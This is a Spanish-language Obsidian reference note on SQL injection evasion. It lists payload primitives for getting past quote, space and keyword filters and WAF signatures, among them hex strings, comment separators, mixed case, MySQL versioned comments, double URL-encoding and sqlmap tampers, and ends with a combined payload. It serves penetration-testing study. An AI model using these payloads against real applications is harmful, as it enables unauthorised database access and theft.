---
tipo: meta
aliases:
  - Payloads evasión
  - SQLi bypass
tags:
  - meta/referencia
  - dominio/web
---

# SQLi evasión - matriz de referencia

> [!info] Referencia pura, no un zettel
> La rama de obstáculos de [[MOC - SQL injection]] entra acá. Cada sección es una primitiva: se **combinan** según lo que filtre el objetivo. `yi``  ` copia el payload.
>
> Se elige por lo que bloquea el filtro, no por gusto. Si filtra comillas, sección "sin comillas"; si filtra espacios, "sin espacios"; y así.

## Sin comillas

Cuando la app escapa o filtra `'` y `"`.

`SELECT 0x61646d696e`
Cadena literal en hexadecimal — `admin` sin comillas. `SELECT hex('admin')` te da el valor.

`SELECT char(97,100,109,105,110)`
Cadena por códigos de carácter. MySQL/PgSQL; MSSQL usa `char(97)+char(100)+...`.

`... WHERE username=0x61646d696e`
El hex funciona directo donde iría un string con comillas.

`... table_name LIKE 0x25`
`0x25` es `%` — comodines sin escribir comillas.

## Sin espacios

Cuando el filtro corta el espacio (` `).

`'/**/UNION/**/SELECT/**/1,2,3-- -`
Comentario en línea como separador. El más portátil.

`'%09UNION%0aSELECT%0d1-- -`
Tabulador (`%09`), newline (`%0a`), CR (`%0d`) — todos cuentan como espacio para el parser.

`'UNION(SELECT(1),(2),(3))-- -`
Paréntesis eliminan la necesidad de espacio entre token y valor.

`'/*!UNION*//*!SELECT*/1,2,3-- -`
Comentario condicional de MySQL: además de separar, ejecuta lo de adentro solo en MySQL.

## Palabras clave bloqueadas

Cuando filtran `UNION`, `SELECT`, `OR`, etc. por lista negra simple.

`UnIoN SeLeCt`
Mezcla de mayúsculas y minúsculas — vence listas negras que no normalizan.

`UNIONUNION SELECTSELECT`  →  tras quitar una ocurrencia queda  `UNION SELECT`
Palabra anidada: si el filtro borra una vez y no repite, la de adentro sobrevive.

`/*!50000UNION*/ /*!50000SELECT*/`
Comentario condicional versionado de MySQL: el motor lo ejecuta, un filtro basado en texto no lo ve como keyword.

`||` en vez de `OR`, `&&` en vez de `AND`
Operadores simbólicos (MySQL) cuando las palabras están filtradas.

## Evasión de WAF

Cuando hay un WAF con firmas, no una lista negra casera. Se combinan las primitivas de arriba más:

`/*!12345UNION*/`
Número alto de versión: WAFs viejos no lo parsean, MySQL sí lo ejecuta.

`%2553ELECT`  →  doble URL-encode
El WAF decodifica una vez y ve `%53ELECT`; el servidor decodifica de nuevo y ejecuta `SELECT`.

`UNION ALL SELECT`
`ALL` a veces esquiva firmas que buscan `UNION SELECT` exacto.

`+UNION+ALL+SELECT+`
Rellenar con `+` (espacio URL) y comentarios para romper la firma por longitud/patrón.

> [!tip] Método antes que payload
> Contra WAF el orden es: identificar qué normaliza (mayúsculas, encoding, comentarios) y atacar el hueco. Herramientas: `sqlmap --tamper` con scripts como `space2comment`, `charencode`, `randomcase`. Los tampers son estas mismas primitivas automatizadas.

## Combinación — ejemplo

Filtra comillas, espacios y `UNION` en mayúsculas:

```
' UNION SELECT 1,2,3-- -           bloqueado (comillas ok, pero UNION y espacios filtrados)
'/**/UnIoN/**/SeLeCt/**/1,2,3-- -  espacios por comentario + case mixto
'/**/UnIoN/**/SeLeCt/**/1,0x61,3-- -  y el string 'a' como 0x61 por si filtra comillas
```

## Relacionadas

[[MOC - SQL injection]] · [[sqlmap]] · [[Dialectos SQL - matriz de referencia]]
